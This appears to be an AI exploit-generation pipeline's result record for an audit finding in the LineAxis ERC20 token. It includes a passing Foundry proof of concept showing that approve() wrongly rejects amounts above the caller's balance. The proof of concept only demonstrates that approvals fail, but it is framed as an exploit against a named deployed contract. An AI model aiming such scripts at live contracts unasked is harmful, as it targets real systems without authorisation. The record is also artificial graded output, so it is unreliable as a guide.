@@ -1,0 +1,61 @@
+{
+  "project_id": "Axis_Token_Smart_Contract_Audit_Report_-_QuillAudits",
+  "target_address": "0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28",
+  "finding_id": 2,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28",
+    "vulnerability_type": "Incorrect ERC20 Implementation",
+    "violation_category": "LOGIC",
+    "finding_id": 2,
+    "preconditions": [
+      {
+        "type": "token_balance",
+        "description": "Attacker must have some balance of the LineAxis token to demonstrate the issue",
+        "token_address": "0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28",
+        "min_amount": "1"
+      },
+      {
+        "type": "state",
+        "description": "Contract must not be frozen (frozen == false)",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "LineAxis(0xf0c5831ec3da15f3696b4dad8b21c7ce2f007f28).approve(address,uint256).success",
+        "operator": "==",
+        "expected_value": "false"
+      }
+    },
+    "exploit_hint": "The ERC20 approve() function incorrectly checks that the approval amount is less than the caller's balance instead of checking against allowance limits. This prevents legitimate approvals when the spender wants to approve more tokens than the owner currently holds. Call approve() with an amount greater than your current token balance to demonstrate the broken functionality."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ILineAxis {\n    function balanceOf(address owner) external view returns(uint);\n    function approve(address spender, uint256 value) external returns(bool);\n    function transfer(address to, uint256 value) external returns(bool);\n    function allowance(address owner, address spender) external view returns(uint);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed beyond what the test framework provides\n        // The target contract is already deployed at TARGET\n        // We'll use deal() to give attacker some tokens\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Give attacker some token balance (less than what we'll try to approve)\n        uint256 attackerBalance = 1000 * 10**18; // 1000 tokens with 18 decimals\n        deal(TARGET, attacker, attackerBalance);\n        \n        // Check current balance to confirm\n        uint256 balanceBefore = ILineAxis(TARGET).balanceOf(attacker);\n        require(balanceBefore == attackerBalance, \"Balance not set correctly\");\n        \n        // Try to approve an amount greater than our balance\n        uint256 approvalAmount = attackerBalance + 1;\n        \n        // This should revert due to the incorrect check in approve()\n        // We expect the transaction to fail\n        bool success;\n        bytes memory returnData;\n        \n        (success, returnData) = TARGET.call(\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(0x1234), approvalAmount)\n        );\n        \n        // The oracle expects success == false\n        // This demonstrates the broken approve() function\n        assertEq(success, false, \"Approve should fail when amount > balance\");\n        \n        // Check allowance to verify state wasn't changed\n        uint256 allowanceAfter = ILineAxis(TARGET).allowance(attacker, address(0x1234));\n        assertEq(allowanceAfter, 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The vulnerability is in the ERC20 approve() function. In the standard ERC20 implementation, approve() should allow setting any allowance amount regardless of the caller's balance. However, this implementation incorrectly checks that the approval amount (value) is less than or equal to the caller's balance (_balanceOf[msg.sender]) via _checkRequireERC20(spender, value, true, _balanceOf[msg.sender]). This prevents legitimate use cases where a user wants to approve a spender for more tokens than they currently hold (e.g., future token receipts or periodic approvals). The oracle expects approve() to fail when called with an amount greater than the caller's balance, demonstrating the broken functionality.",
+      "attack_strategy": "We need to demonstrate that the approve() function incorrectly reverts when trying to approve an amount greater than our token balance. We'll: 1. Ensure we have some token balance (but less than the approval amount we want to test). 2. Call approve() with an amount greater than our balance. 3. Verify the call reverts (which is the expected broken behavior).",
+      "step_by_step_plan": "1. Get the attacker some token balance using deal() cheatcode. 2. Choose an approval amount greater than the attacker's balance. 3. Call approve() with that amount. 4. The call should revert due to the incorrect check, demonstrating the vulnerability.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ILineAxis {\n    function balanceOf(address owner) external view returns(uint);\n    function approve(address spender, uint256 value) external returns(bool);\n    function transfer(address to, uint256 value) external returns(bool);\n    function allowance(address owner, address spender) external view returns(uint);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed beyond what the test framework provides\n        // The target contract is already deployed at TARGET\n        // We'll use deal() to give attacker some tokens\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Give attacker some token balance (less than what we'll try to approve)\n        uint256 attackerBalance = 1000 * 10**18; // 1000 tokens with 18 decimals\n        deal(TARGET, attacker, attackerBalance);\n        \n        // Check current balance to confirm\n        uint256 balanceBefore = ILineAxis(TARGET).balanceOf(attacker);\n        require(balanceBefore == attackerBalance, \"Balance not set correctly\");\n        \n        // Try to approve an amount greater than our balance\n        uint256 approvalAmount = attackerBalance + 1;\n        \n        // This should revert due to the incorrect check in approve()\n        // We expect the transaction to fail\n        bool success;\n        bytes memory returnData;\n        \n        (success, returnData) = TARGET.call(\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(0x1234), approvalAmount)\n        );\n        \n        // The oracle expects success == false\n        // This demonstrates the broken approve() function\n        assertEq(success, false, \"Approve should fail when amount > balance\");\n        \n        // Check allowance to verify state wasn't changed\n        uint256 allowanceAfter = ILineAxis(TARGET).allowance(attacker, address(0x1234));\n        assertEq(allowanceAfter, 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 38.39025926589966,
+      "prompt_tokens": 5152,
+      "completion_tokens": 1249,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 38.39285707473755,
+  "total_prompt_tokens": 5152,
+  "total_completion_tokens": 1249,
+  "total_cost": 0.0
+}
